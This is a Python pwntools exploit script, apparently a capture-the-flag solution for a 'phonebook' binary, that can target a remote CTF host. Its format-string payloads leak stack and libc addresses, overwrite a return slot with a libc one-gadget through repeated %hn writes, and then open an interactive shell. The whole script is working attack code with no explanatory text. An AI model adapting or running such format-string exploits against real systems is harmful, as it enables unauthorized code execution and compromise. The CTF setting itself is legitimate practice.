from pwn import *

e = ELF("./phonebook")
libc = ELF("./libc.so")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("phonebook.nc.jctf.pro", 1337)
else:
  p = process(e.path)

def fmt(s):
  p.sendlineafter(">", "2")
  p.sendlineafter(":", s)
  p.sendlineafter(":", "0")
  p.recvuntil("Contant added with index 0")

  p.sendlineafter(">", "1")
  p.sendlineafter(":", "0")

def clean():
  p.sendlineafter(">", "3")
  p.sendlineafter(":", "0")

gdb.attach(p)
fmt(";%1$lx;%191$lx;")

p.recvuntil(";")

stack_leak = int(p.recvuntil(";", drop=True), 16) + 0x2c68
libc_leak = int(p.recvuntil(";", drop=True), 16) - 0x7f841be03f8a + 0x00007f841bde3000

print("{:#x}".format(libc_leak))
print("{:#x}".format(stack_leak))

clean()

payload = (
	p64(libc_leak + 0xe4d8e)
)

for i in range(len(payload) / 2):
  goal = u64(payload[2*i:2*i+2].ljust(8, "\x00"))

  if goal <= 0x10:
    fmt((("A" * goal) + "%18$hn").ljust(24 + 7, "A") + p64(stack_leak + 2 * i))
  else:
    fmt(("%" + str(goal) + "x" + "%18$hn").ljust(24 + 7, "A") + p64(stack_leak + 2 * i))		

  clean()	


p.interactive()
